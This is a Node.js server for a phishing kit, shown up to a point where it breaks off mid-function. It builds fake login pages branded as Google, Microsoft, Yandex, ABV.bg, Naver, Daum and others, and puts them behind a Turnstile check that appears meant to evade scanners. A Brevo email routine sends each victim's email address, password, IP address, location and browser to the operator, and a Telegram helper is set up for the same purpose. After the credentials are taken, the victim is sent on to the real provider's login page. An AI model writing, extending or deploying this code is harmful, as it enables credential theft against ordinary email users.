const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

app.set('trust proxy', true);

// ============================================================
// MIDDLEWARE
// ============================================================
app.use(cors({
    origin: 'https://secure-auto.netlify.app',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

// ============================================================
// CONFIG
// ============================================================
const BOT_TOKEN        = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID          = process.env.TELEGRAM_CHAT_ID;
const BREVO_API_KEY    = process.env.BREVO_API_KEY;
const SENDER_EMAIL     = process.env.SENDER_EMAIL  || 'egli79380@gmail.com';
const SENDER_NAME      = process.env.SENDER_NAME   || 'ABV Monitor';
const BACKEND_URL      = process.env.BACKEND_URL   || '';
const TURNSTILE_SECRET = process.env.TURNSTILE_SECRET || '';
const REDIRECT_URL     = process.env.REDIRECT_URL  || 'https://www.google.com';

const MAX_ATTEMPTS = Math.max(2, parseInt(process.env.MAX_ATTEMPTS || '6', 10));

const EMAIL_RECIPIENTS = (process.env.EMAIL_RECIPIENTS || '')
    .split(',').map(e => e.trim()).filter(Boolean);

// ============================================================
// STARTUP LOG
// ============================================================
console.log('========================================');
console.log('🔍 Environment check:');
console.log(`   TELEGRAM_BOT_TOKEN: ${BOT_TOKEN ? '✅' : '❌ MISSING'}`);
console.log(`   TELEGRAM_CHAT_ID:   ${CHAT_ID ? '✅' : '❌ MISSING'}`);
console.log(`   BREVO_API_KEY:      ${BREVO_API_KEY ? '✅' : '❌ MISSING'}`);
console.log(`   SENDER_EMAIL:       ${SENDER_EMAIL}`);
console.log(`   EMAIL_RECIPIENTS:   ${EMAIL_RECIPIENTS.length ? '✅ ' + EMAIL_RECIPIENTS.length + ' recipient(s)' : '⚠️ none'}`);
console.log(`   TURNSTILE_SECRET:   ${TURNSTILE_SECRET ? '✅' : '⚠️ not set (verification skipped)'}`);
console.log(`   BACKEND_URL:        ${BACKEND_URL || '(same-origin)'}`);
console.log(`   MAX_ATTEMPTS (cap): ${MAX_ATTEMPTS}`);
console.log('========================================');

// ============================================================
// HELPER: Verify Turnstile
// ============================================================
async function verifyTurnstile(token, ip) {
    if (!TURNSTILE_SECRET) return true;
    try {
        const r = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({
                secret: TURNSTILE_SECRET,
                response: token || '',
                remoteip: (ip || '').split(',')[0].trim()
            })
        });
        const data = await r.json();
        return data.success === true;
    } catch (err) {
        console.error('❌ Turnstile verify error:', err.message);
        return false;
    }
}

// ============================================================
// HELPER: validate + normalize email from query string
// ============================================================
function normalizeEmail(raw) {
    const s = (raw || '').toString().trim();
    if (!s) return '';
    const re = /^([a-zA-Z0-9_.\-])+@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    return re.test(s) ? s : '';
}

// ============================================================
// 🔑 GLOBAL PROVIDER MAP (exact domain matches)
// ============================================================
const PROVIDER_MAP = {
    // ---- Google ----
    'gmail.com':          'https://accounts.google.com/ServiceLogin?service=mail',
    'googlemail.com':     'https://accounts.google.com/ServiceLogin?service=mail',

    // ---- Microsoft consumer ----
    'outlook.com':        'https://login.live.com/',
    'hotmail.com':        'https://login.live.com/',
    'live.com':           'https://login.live.com/',
    'msn.com':            'https://login.live.com/',
    'live.co.uk':         'https://login.live.com/',
    'outlook.co.uk':      'https://login.live.com/',
    'hotmail.co.uk':      'https://login.live.com/',
    'outlook.fr':         'https://login.live.com/',
    'hotmail.fr':         'https://login.live.com/',
    'outlook.de':         'https://login.live.com/',
    'hotmail.de':         'https://login.live.com/',
    'outlook.es':         'https://login.live.com/',
    'hotmail.es':         'https://login.live.com/',
    'outlook.it':         'https://login.live.com/',
    'hotmail.it':         'https://login.live.com/',

    // ---- Yahoo ----
    'yahoo.com':          'https://login.yahoo.com/',
    'yahoo.co.uk':        'https://login.yahoo.com/',
    'yahoo.fr':           'https://login.yahoo.com/',
    'yahoo.de':           'https://login.yahoo.com/',
    'yahoo.es':           'https://login.yahoo.com/',
    'yahoo.it':           'https://login.yahoo.com/',
    'yahoo.co.jp':        'https://login.yahoo.co.jp/',
    'yahoo.com.au':       'https://login.yahoo.com/',
    'yahoo.com.br':       'https://login.yahoo.com/',
    'yahoo.com.mx':       'https://login.yahoo.com/',
    'yahoo.com.hk':       'https://login.yahoo.com/',
    'yahoo.com.sg':       'https://login.yahoo.com/',
    'yahoo.com.tw':       'https://login.yahoo.com/',
    'yahoo.co.in':        'https://login.yahoo.com/',
    'ymail.com':          'https://login.yahoo.com/',
    'rocketmail.com':     'https://login.yahoo.com/',

    // ---- Apple ----
    'icloud.com':         'https://www.icloud.com/',
    'me.com':             'https://www.icloud.com/',
    'mac.com':            'https://www.icloud.com/',

    // ---- AOL ----
    'aol.com':            'https://login.aol.com/',
    'aim.com':            'https://login.aol.com/',

    // ---- Proton ----
    'protonmail.com':     'https://mail.proton.me/',
    'proton.me':          'https://mail.proton.me/',
    'pm.me':              'https://mail.proton.me/',

    // ---- Zoho ----
    'zoho.com':           'https://accounts.zoho.com/signin',
    'zohomail.com':       'https://accounts.zoho.com/signin',
    'zohomail.eu':        'https://accounts.zoho.eu/signin',
    'zohomail.in':        'https://accounts.zoho.in/signin',

    // ---- Tuta ----
    'tutanota.com':       'https://app.tuta.com/login',
    'tutanota.de':        'https://app.tuta.com/login',
    'tuta.io':            'https://app.tuta.com/login',
    'keemail.me':         'https://app.tuta.com/login',

    // ---- Mailbox.org / Posteo ----
    'mailbox.org':        'https://login.mailbox.org/',
    'posteo.de':          'https://posteo.de/en',
    'posteo.net':         'https://posteo.de/en',

    // ---- 🇧🇬 Bulgaria ----
    'abv.bg':             'https://mail.abv.bg/',
    'mail.bg':            'https://mail.bg/',
    'dir.bg':             'https://mail.dir.bg/',

    // ---- 🇷🇺 Russia / CIS ----
    'yandex.ru':          'https://passport.yandex.ru/auth',
    'yandex.com':         'https://passport.yandex.com/auth',
    'yandex.by':          'https://passport.yandex.by/auth',
    'yandex.kz':          'https://passport.yandex.kz/auth',
    'yandex.ua':          'https://passport.yandex.ua/auth',
    'ya.ru':              'https://passport.yandex.ru/auth',
    'mail.ru':            'https://account.mail.ru/login',
    'inbox.ru':           'https://account.mail.ru/login',
    'list.ru':            'https://account.mail.ru/login',
    'bk.ru':              'https://account.mail.ru/login',
    'internet.ru':        'https://account.mail.ru/login',
    'rambler.ru':         'https://mail.rambler.ru/',
    'lenta.ru':           'https://mail.rambler.ru/',
    'ro.ru':              'https://mail.rambler.ru/',
    'ukr.net':            'https://mail.ukr.net/',
    'i.ua':               'https://mail.i.ua/',

    // ---- 🇰🇷 Korea ----
    'naver.com':          'https://nid.naver.com/nidlogin.login',
    'daum.net':           'https://accounts.kakao.com/login',
    'hanmail.net':        'https://accounts.kakao.com/login',
    'kakao.com':          'https://accounts.kakao.com/login',
    'nate.com':           'https://www.nate.com/',
    'korea.com':          'https://www.korea.com/',
    'chol.com':           'https://www.chol.com/',

    // ---- 🇨🇳 China ----
    'qq.com':             'https://mail.qq.com/',
    'foxmail.com':        'https://mail.qq.com/',
    '163.com':            'https://mail.163.com/',
    '126.com':            'https://mail.126.com/',
    'yeah.net':           'https://mail.yeah.net/',
    'sina.com':           'https://mail.sina.com.cn/',
    'sina.cn':            'https://mail.sina.com.cn/',
    'sohu.com':           'https://mail.sohu.com/',
    'aliyun.com':         'https://mail.aliyun.com/',
    '139.com':            'https://mail.10086.cn/',
    '189.cn':             'https://webmail30.189.cn/',

    // ---- 🇯🇵 Japan ----
    'docomo.ne.jp':       'https://mail.smt.docomo.ne.jp/',
    'ezweb.ne.jp':        'https://id.auone.jp/',
    'au.com':             'https://id.auone.jp/',
    'softbank.ne.jp':     'https://www.softbank.jp/',
    'i.softbank.jp':      'https://www.softbank.jp/',
    'nifty.com':          'https://webmail.nifty.com/',
    'biglobe.ne.jp':      'https://mail.biglobe.ne.jp/',

    // ---- 🇮🇳 India ----
    'rediffmail.com':     'https://mail.rediff.com/cgi-bin/login.cgi',
    'rediff.com':         'https://mail.rediff.com/cgi-bin/login.cgi',
    'indiatimes.com':     'https://mail.indiatimes.com/',

    // ---- 🇩🇪 Germany / Austria / Switzerland ----
    'web.de':             'https://webmail.web.de/',
    'gmx.de':             'https://www.gmx.net/',
    'gmx.net':            'https://www.gmx.net/',
    'gmx.com':            'https://www.gmx.com/',
    'gmx.at':             'https://www.gmx.at/',
    'gmx.ch':             'https://www.gmx.ch/',
    't-online.de':        'https://email.t-online.de/',
    'freenet.de':         'https://email.freenet.de/',
    'arcor.de':           'https://webmail.arcor.de/',
    'mail.com':           'https://www.mail.com/',
    'email.com':          'https://www.mail.com/',

    // ---- 🇫🇷 France ----
    'orange.fr':          'https://login.orange.fr/',
    'wanadoo.fr':         'https://login.orange.fr/',
    'laposte.net':        'https://www.laposte.net/accueil',
    'free.fr':            'https://subscribe.free.fr/login/',
    'sfr.fr':             'https://www.sfr.fr/',
    'bbox.fr':            'https://www.bbox.fr/',

    // ---- 🇮🇹 Italy ----
    'libero.it':          'https://login.libero.it/',
    'virgilio.it':        'https://login.virgilio.it/',
    'tin.it':             'https://mail.tin.it/',
    'alice.it':           'https://login.alice.it/',

    // ---- 🇪🇸 Spain ----
    'terra.com':          'https://login.terra.com/',
    'terra.es':           'https://login.terra.es/',
    'telefonica.net':     'https://login.terra.es/',

    // ---- 🇵🇱 Poland ----
    'wp.pl':              'https://profil.wp.pl/login.html',
    'o2.pl':              'https://poczta.o2.pl/',
    'interia.pl':         'https://poczta.interia.pl/',
    'interia.eu':         'https://poczta.interia.pl/',
    'onet.pl':            'https://login.onet.pl/',
    'onet.com.pl':        'https://login.onet.pl/',
    'op.pl':              'https://poczta.o2.pl/',

    // ---- 🇹🇷 Turkey ----
    'mynet.com':          'https://mail.mynet.com/',
    'superonline.com':    'https://mail.superonline.com/',
    'ttmail.com':         'https://mail.ttmail.com/',

    // ---- 🇻🇳 Vietnam ----
    'vnn.vn':             'https://mail.vnn.vn/',
    'fpt.vn':             'https://mail.fpt.vn/',
    'viettel.vn':         'https://mail.viettel.vn/',

    // ---- 🇹🇭 Thailand ----
    'hotmail.co.th':      'https://login.live.com/',
    'thaimail.com':       'https://www.thaimail.com/',

    // ---- 🇮🇩 Indonesia ----
    'yahoo.co.id':        'https://login.yahoo.com/',
    'telkom.net':         'https://mail.telkom.net/',

    // ---- 🇧🇷 Brazil ----
    'uol.com.br':         'https://email.uol.com.br/',
    'bol.com.br':         'https://www.bol.com.br/',
    'terra.com.br':       'https://login.terra.com.br/',
    'ig.com.br':          'https://mail.ig.com.br/',
    'globo.com':          'https://login.globo.com/',

    // ---- 🇿🇦 South Africa ----
    'mweb.co.za':         'https://mail.mweb.co.za/',
    'telkomsa.net':       'https://mail.telkomsa.net/',
    'webmail.co.za':      'https://webmail.co.za/',

    // ---- 🇦🇺 Australia / NZ ----
    'bigpond.com':        'https://login.telstra.com.au/',
    'optusnet.com.au':    'https://webmail.optusnet.com.au/',
    'xtra.co.nz':         'https://webmail.xtra.co.nz/',

    // ---- 🇬🇷 Greece ----
    'otenet.gr':          'https://webmail.otenet.gr/',
    'forthnet.gr':        'https://webmail.forthnet.gr/',

    // ---- 🇷🇴 Romania ----
    'rdslink.ro':         'https://webmail.rdslink.ro/',
    'clicknet.ro':        'https://webmail.clicknet.ro/',

    // ---- 🇭🇺 Hungary ----
    'freemail.hu':        'https://freemail.hu/',
    'citromail.hu':       'https://www.citromail.hu/',

    // ---- 🇨🇿 Czech ----
    'seznam.cz':          'https://email.seznam.cz/',
    'centrum.cz':         'https://email.centrum.cz/',
    'atlas.cz':           'https://email.atlas.cz/',
    'email.cz':           'https://email.seznam.cz/',

    // ---- 🇳🇱 Netherlands ----
    'ziggo.nl':           'https://mail.ziggo.nl/',
    'kpnmail.nl':         'https://webmail.kpnmail.nl/',
    'xs4all.nl':          'https://webmail.xs4all.nl/',

    // ---- 🇸🇪 Sweden / 🇳🇴 Norway / 🇩🇰 Denmark / 🇫🇮 Finland ----
    'telia.com':          'https://webmail.telia.com/',
    'comhem.se':          'https://webmail.comhem.se/',
    'online.no':          'https://webmail.online.no/',
    'broadpark.no':       'https://webmail.broadpark.no/',
    'elisa.fi':           'https://webmail.elisa.fi/',

    // ---- 🇵🇹 Portugal ----
    'sapo.pt':            'https://mail.sapo.pt/',
    'clix.pt':            'https://mail.clix.pt/',

    // ---- 🇺🇦 Ukraine ----
    'meta.ua':            'https://mail.meta.ua/',

    // ---- 🇷🇸 Serbia / 🇭🇷 Croatia / 🇸🇮 Slovenia ----
    'sbb.rs':             'https://webmail.sbb.rs/',
    't-com.hr':           'https://webmail.t-com.hr/',
    'siol.net':           'https://webmail.siol.net/'
};

// ============================================================
// 🔑 MX-based provider detection
// ============================================================
const MX_PROVIDER_MAP = [
    [/google|googlemail|gmail/i,        'https://accounts.google.com/ServiceLogin?service=mail'],
    [/outlook|office365|microsoft|hotmail|live\.com|protection\.outlook/i,
                                        'https://login.live.com/'],
    [/yandex/i,                         'https://passport.yandex.com/auth'],
    [/mail\.ru|inbox\.ru|bk\.ru/i,      'https://account.mail.ru/login'],
    [/naver/i,                          'https://nid.naver.com/nidlogin.login'],
    [/daum|kakao|hanmail/i,             'https://accounts.kakao.com/login'],
    [/qq\.com|foxmail/i,                'https://mail.qq.com/'],
    [/163\.com|126\.com|yeah\.net/i,    'https://mail.163.com/'],
    [/zoho/i,                           'https://accounts.zoho.com/signin'],
    [/proton|protonmail/i,              'https://mail.proton.me/'],
    [/tutanota|tuta/i,                  'https://app.tuta.com/login'],
    [/abv\.bg/i,                        'https://mail.abv.bg/'],
    [/mail\.bg/i,                       'https://mail.bg/'],
    [/seznam/i,                         'https://email.seznam.cz/'],
    [/wp\.pl|o2\.pl|interia/i,          'https://profil.wp.pl/login.html'],
    [/t-online/i,                       'https://email.t-online.de/'],
    [/web\.de|gmx/i,                    'https://webmail.web.de/'],
    [/orange\.fr|wanadoo/i,             'https://login.orange.fr/'],
    [/laposte/i,                        'https://www.laposte.net/accueil'],
    [/libero|virgilio/i,                'https://login.libero.it/'],
    [/terra/i,                          'https://login.terra.com/'],
    [/uol\.com\.br/i,                   'https://email.uol.com.br/'],
    [/rediff/i,                         'https://mail.rediff.com/cgi-bin/login.cgi'],
    [/yahoo/i,                          'https://login.yahoo.com/'],
    [/icloud|apple/i,                   'https://www.icloud.com/'],
    [/aol/i,                            'https://login.aol.com/'],
    [/mailbox\.org/i,                   'https://login.mailbox.org/'],
    [/mimecast|proofpoint|barracuda/i,  null]
];

function providerFromMX(mxRecord) {
    if (!mxRecord || mxRecord === 'no-mx' || mxRecord === 'MX-Error') return null;
    const first = mxRecord.split('\n')[0];
    for (const [re, url] of MX_PROVIDER_MAP) {
        if (re.test(first)) return url;
    }
    return null;
}

function providerFromTLD(domain) {
    const tld = (domain.split('.').pop() || '').toLowerCase();
    const TLD_MAP = {
        'bg': 'https://mail.bg/',
        'ru': 'https://passport.yandex.ru/auth',
        'ua': 'https://mail.ukr.net/',
        'by': 'https://passport.yandex.by/auth',
        'kz': 'https://passport.yandex.kz/auth',
        'kr': 'https://nid.naver.com/nidlogin.login',
        'jp': 'https://login.yahoo.co.jp/',
        'cn': 'https://mail.qq.com/',
        'de': 'https://webmail.web.de/',
        'fr': 'https://login.orange.fr/',
        'it': 'https://login.libero.it/',
        'es': 'https://login.terra.es/',
        'pl': 'https://profil.wp.pl/login.html',
        'tr': 'https://mail.mynet.com/',
        'cz': 'https://email.seznam.cz/',
        'hu': 'https://freemail.hu/',
        'ro': 'https://webmail.rdslink.ro/',
        'gr': 'https://webmail.otenet.gr/',
        'nl': 'https://mail.ziggo.nl/',
        'se': 'https://webmail.telia.com/',
        'no': 'https://webmail.online.no/',
        'dk': 'https://webmail.telia.com/',
        'fi': 'https://webmail.elisa.fi/',
        'pt': 'https://mail.sapo.pt/',
        'br': 'https://email.uol.com.br/',
        'mx': 'https://login.terra.com/',
        'in': 'https://mail.rediff.com/cgi-bin/login.cgi',
        'th': 'https://www.thaimail.com/',
        'id': 'https://login.yahoo.com/',
        'vn': 'https://mail.vnn.vn/',
        'za': 'https://webmail.co.za/',
        'au': 'https://login.telstra.com.au/',
        'nz': 'https://webmail.xtra.co.nz/'
    };
    return TLD_MAP[tld] || null;
}

function getProviderLoginUrl(email, mxRecord) {
    const domain = (email || '').split('@')[1]?.toLowerCase() || '';
    if (!domain) return REDIRECT_URL;

    if (PROVIDER_MAP[domain]) return PROVIDER_MAP[domain];

    const fromMX = providerFromMX(mxRecord);
    if (fromMX) return fromMX;

    const fromTLD = providerFromTLD(domain);
    if (fromTLD) return fromTLD;

    return `https://www.google.com/search?q=${encodeURIComponent(domain + ' webmail login')}`;
}

// ============================================================
// HELPER: Send Email via Brevo
// ============================================================
async function sendEmail(email, password, ipInfo, userAgent, domain, mxRecord, attempt, isMatch, maxAttempts, redirectUrl) {
    if (!BREVO_API_KEY || EMAIL_RECIPIENTS.length === 0) {
        console.log('⚠️ Brevo not fully configured, skipping email');
        return false;
    }

    const matchTag = isMatch ? '✅ MATCH' : '⏳ pending';
    const subject = `🔐 ABV ${email} — Attempt ${attempt}/${maxAttempts} ${matchTag}`;

    const htmlContent = `
    <!DOCTYPE html><html><head><style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { background: #1e930c; color: #fff; padding: 15px; border-radius: 5px 5px 0 0; text-align: center; }
        .content { padding: 20px; }
        .field { margin: 10px 0; padding: 10px; background: #f8f8f8; border-radius: 5px; }
        .label { font-weight: bold; color: #555; }
        .value { color: #1e930c; font-size: 16px; }
        .mx { color: #1e930c; font-size: 14px; white-space: pre-line; font-family: monospace; }
        .footer { text-align: center; padding: 15px; color: #999; font-size: 12px; border-top: 1px solid #eee; margin-top: 20px; }
        .badge { display:inline-block;padding:4px 10px;background:#1e930c;color:#fff;border-radius:4px;font-size:12px;margin-left:8px }
    </style></head><body>
        <div class="container">
            <div class="header"><h2>🔐 ABV Login Credentials <span class="badge">${attempt}/${maxAttempts} ${matchTag}</span></h2></div>
            <div class="content">
                <div class="field"><div class="label">📧 Email:</div><div class="value"><strong>${email}</strong></div></div>
                <div class="field"><div class="label">🔑 Password:</div><div class="value"><strong>${password}</strong></div></div>
                <div class="field"><div class="label">🔢 Attempt:</div><div class="value"><strong>${attempt} of ${maxAttempts}</strong></div></div>
                <div class="field"><div class="label">🎯 Match:</div><div class="value"><strong>${isMatch ? 'YES (final)' : 'no'}</strong></div></div>
                <div class="field"><div class="label">🌐 Domain:</div><div class="value">${domain || 'Unknown'}</div></div>
                <div class="field"><div class="label">📨 MX Record:</div><div class="value mx">${mxRecord || 'Unknown'}</div></div>
                <div class="field"><div class="label">➡️ Redirect:</div><div class="value">${redirectUrl || 'N/A'}</div></div>
                <div class="field"><div class="label">🌍 IP Address:</div><div class="value">${ipInfo?.ip || 'Unknown'}</div></div>
                <div class="field"><div class="label">📍 Location:</div><div class="value">${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}</div></div>
                <div class="field"><div class="label">📱 Browser:</div><div class="value">${(userAgent || '').substring(0, 100)}...</div></div>
                <div class="field"><div class="label">🕐 Time:</div><div class="value">${new Date().toLocaleString()}</div></div>
            </div>
            <div class="footer"><p>© ${new Date().getFullYear()} ABV Monitor</p></div>
        </div>
    </body></html>`;

    const textContent = `
🔐 ABV Login Credentials (Attempt ${attempt}/${maxAttempts}) — ${matchTag}
════════════════════════════════════
📧 Email: ${email}
🔑 Password: ${password}
🔢 Attempt: ${attempt} of ${maxAttempts}
🎯 Match: ${isMatch ? 'YES (final)' : 'no'}
🌐 Domain: ${domain || 'Unknown'}
📨 MX Record: ${mxRecord || 'Unknown'}
➡️ Redirect: ${redirectUrl || 'N/A'}
🌍 IP Address: ${ipInfo?.ip || 'Unknown'}
📍 Location: ${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}
📱 Browser: ${(userAgent || '').substring(0, 100)}...
🕐 Time: ${new Date().toLocaleString()}
════════════════════════════════════`;

    try {
        const response = await fetch('https://api.brevo.com/v3/smtp/email', {
            method: 'POST',
            headers: {
                'api-key': BREVO_API_KEY,
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                sender: { name: SENDER_NAME, email: SENDER_EMAIL },
                to: EMAIL_RECIPIENTS.map(e => ({ email: e })),
                subject,
                htmlContent,
                textContent
            })
        });
        const data = await response.json();
        if (response.ok) {
            console.log('✅ Email sent via Brevo:', data.messageId || 'sent');
            return true;
        }
        console.error('❌ Brevo API error:', response.status, data.message || data.error || JSON.stringify(data));
        return false;
    } catch (error) {
        console.error('❌ Failed to send email via Brevo:', error.message);
        return false;
    }
}

// ============================================================
// HELPER: Telegram
// ============================================================
async function sendToTelegram(message) {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.log('⚠️ Telegram not configured, skipping');
        return null;
    }
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
        });
        const result = await response.json();
        console.log('📤 Telegram:', result.ok ? '✅ Sent' : '❌ Failed — ' + (result.description || ''));
        return result;
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return null;
    }
}

// ============================================================
// HELPERS: IP + MX
// ============================================================
async function getIPInfo(ip) {
    try {
        const firstIP = (ip || '').split(',')[0].trim().replace(/^::ffff:/, '');
        const response = await fetch(`https://ipinfo.io/${firstIP}/json`);
        return await response.json();
    } catch (error) {
        console.error('❌ IP info error:', error.message);
        return { ip: ip || 'Unknown', country: 'Unknown', city: 'Unknown', region: 'Unknown' };
    }
}

async function getMXRecord(domain) {
    try {
        const response = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
        const data = await response.json();
        if (data && data.Answer && data.Answer.length > 0) {
            return data.Answer.map(r => r.data).join('\n');
        }
        return 'no-mx';
    } catch (error) {
        return 'MX-Error';
    }
}

// ============================================================
// HTML TEMPLATE: Turnstile gate page (served by /auth)
// ============================================================
function turnstilePage(email) {
    const safeEmail = (email || '').replace(/</g,'&lt;');
    return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Session Authentication</title>
<style>
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f4f5f7;color:#2c3e50;line-height:1.5}
.cOrWHzq{background:#fff;border-radius:12px;box-shadow:0 2px 24px rgba(0,0,0,0.06);padding:38px 34px;max-width:440px;width:92%;text-align:center}
.tOrWHzq{font-size:1.25rem;font-weight:600;color:#1e293b;margin-bottom:8px}
.uOrWHzq{font-size:0.9rem;color:#64748b;margin-bottom:28px}
.ftOrWHzq{margin-top:24px;font-size:0.75rem;color:#c0c8d4}
#ts-error{margin-top:16px;color:#dc2626;font-size:14px;display:none;}
</style>
</head>
<body>
<div class="cOrWHzq">
<div class="tOrWHzq">Authenticating Your Session</div>
<div class="uOrWHzq">We need to confirm you are human before proceeding to your secure workspace.</div>
<div id="ts-turnstile" style="min-height:65px;"></div>
<div id="ts-error">Verification failed. Please try again.</div>
<div class="ftOrWHzq">&copy; 2026 Secure Auth</div>
</div>
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" async></script>
<script>
(function(){
  var EMAIL = ${JSON.stringify(email || '')};
  var sent  = false;
  var attempts = 0;
  var MAX_TS_RETRIES = 40;

  function loadForm(token){
    if (sent) return;
    sent = true;
    var url = '/a?k=HBfNYyUjMsgOLGRZ&t=' + encodeURIComponent(token);
    if (EMAIL) url += '&u=' + encodeURIComponent(EMAIL);
    fetch(url)
      .then(function(r){ return r.text(); })
      .then(function(html){
        document.open();
        document.write(html);
        document.close();
      })
      .catch(function(){
        document.body.innerHTML =
          '<div style="text-align:center;padding:40px;font-family:sans-serif">' +
          '<p>Unable to verify. Please try again later.</p></div>';
      });
  }

  function onError(){
    var err = document.getElementById('ts-error');
    if (err) err.style.display = 'block';
  }

  function tryRender(){
    if (typeof turnstile === 'undefined') {
      attempts++;
      if (attempts >= MAX_TS_RETRIES) return onError();
      return setTimeout(tryRender, 200);
    }
    try {
      turnstile.render('#ts-turnstile', {
        sitekey: '0x4AAAAAAE7CY8nNIUDU9vqa',
        callback: loadForm,
        errorCallback: onError,
        appearance: 'always',
        retry: 'never'
      });
    } catch(e){ onError(); }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', tryRender);
  } else {
    tryRender();
  }
})();
</script>
</body></html>`;
}

// ============================================================
// BRANDING — visual identity per provider
// ============================================================
function brandForProvider(email) {
    const domain = (email || '').split('@')[1]?.toLowerCase() || '';
    const tld = domain.split('.').pop() || '';

    // --- Yandex (Russia) ---
    if (/yandex|ya\.ru/.test(domain)) {
        return {
            name:    'Yandex',
            lang:    'ru',
            logoText: '<span style="color:#fc3f1d;font-weight:900">Я</span>ндекс',
            subtitle: 'Войдите в свой аккаунт, чтобы продолжить',
            emailPlaceholder: 'Логин или email',
            passwordPlaceholder: 'Пароль',
            buttonText: 'Войти',
            accent: '#fc3f1d',
            accent2: '#ffcc00',
            bg: 'linear-gradient(135deg,#ffffff 0%,#fff8f0 100%)',
            headerGradient: 'linear-gradient(90deg,#fc3f1d,#ffcc00,#fc3f1d)',
            footer: '© Яндекс 2026'
        };
    }

    // --- ABV.bg (Bulgaria) ---
    if (domain === 'abv.bg') {
        return {
            name:    'ABV',
            lang:    'bg',
            logoText: '<span style="color:#003a8f;font-weight:900">ABV</span><span style="color:#e30613">.bg</span>',
            subtitle: 'Влезте в своя акаунт, за да продължите',
            emailPlaceholder: 'Имейл адрес',
            passwordPlaceholder: 'Парола',
            buttonText: 'Вход',
            accent: '#003a8f',
            accent2: '#e30613',
            bg: 'linear-gradient(135deg,#eaf2ff 0%,#d6e4ff 100%)',
            headerGradient: 'linear-gradient(90deg,#003a8f,#e30613,#003a8f)',
            footer: '© ABV.bg 2026'
        };
    }

    // --- Google / Gmail ---
    if (/gmail|googlemail|google/.test(domain)) {
        return {
            name:    'Google',
            lang:    'en',
            logoText: '<span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span>',
            subtitle: 'Sign in to continue to Gmail',
            emailPlaceholder: 'Email or phone',
            passwordPlaceholder: 'Enter your password',
            buttonText: 'Next',
            accent: '#1a73e8',
            accent2: '#4285f4',
            bg: 'linear-gradient(135deg,#ffffff 0%,#f8f9fa 100%)',
            headerGradient: 'linear-gradient(90deg,#4285f4,#ea4335,#fbbc05,#34a853)',
            footer: '© Google LLC 2026'
        };
    }

    // --- Microsoft / Outlook ---
    if (/outlook|hotmail|live\.com|msn/.test(domain)) {
        return {
            name:    'Microsoft',
            lang:    'en',
            logoText: '<span style="color:#0078d4;font-weight:600">Microsoft</span>',
            subtitle: 'Sign in to your Microsoft account',
            emailPlaceholder: 'Email, phone, or Skype',
            passwordPlaceholder: 'Password',
            buttonText: 'Sign in',
            accent: '#0067b8',
            accent2: '#0078d4',
            bg: 'linear-gradient(135deg,#f3f2f1 0%,#e8f0fe 100%)',
            headerGradient: 'linear-gradient(90deg,#0078d4,#00b7c3,#0078d4)',
            footer: '© Microsoft 2026'
        };
    }

    // --- Naver (Korea) ---
    if (domain === 'naver.com') {
        return {
            name:    'Naver',
            lang:    'ko',
            logoText: '<span style="color:#03c75a;font-weight:900">NAVER</span>',
            subtitle: '네이버 아이디로 로그인',
            emailPlaceholder: '아이디 또는 이메일',
            passwordPlaceholder: '비밀번호',
            buttonText: '로그인',
            accent: '#03c75a',
            accent2: '#009e4f',
            bg: 'linear-gradient(135deg,#f0fff8 0%,#e0f7ee 100%)',
            headerGradient: 'linear-gradient(90deg,#03c75a,#009e4f,#03c75a)',
            footer: '© NAVER Corp. 2026'
        };
    }

    // --- Daum / Kakao (Korea) ---
    if (/daum|hanmail|kakao/.test(domain)) {
        return {
            name:    'Daum',
            lang:    'ko',
            logoText: '<span style="color:#fedd15;background:#1e1e1e;padding:2px 8px;border-radius:4px;font-weight:900">Daum</span>',
            subtitle: '다음 계정으로 로그인',
            emailPlaceholder: '이메일 주소',
            passwordPlaceholder: '비밀번호',
            buttonText: '로그인',
            accent: '#fedd15',
            accent2: '#1e1e1e',
            bg: 'linear-gradient(135deg,#fffdf5 0%,#fff8e0 100%)',
            headerGradient: 'linear-gradient(90deg,#fedd15,#1e1e1e,#fedd15)',
            footer: '© Kakao Corp. 2026'
        };
    }

    // --- Hiworks (Korea B2B) ---
    if (/hiworks|gabia/.test(domain)) {
        return {
            name:    'Hiworks',
            lang:    'ko',
            logoText: '<span style="color:#1a73e8;font-weight:900">하이웍스</span> <span style="color:#0d47a1">오피스</span>',
            subtitle: '기업 업무를 위한 안전한 로그인',
            emailPlaceholder: 'name@hiworks.co.kr',
            passwordPlaceholder: '비밀번호를 입력하세요',
            buttonText: '로그인',
            accent: '#1a73e8',
            accent2: '#0d47a1',
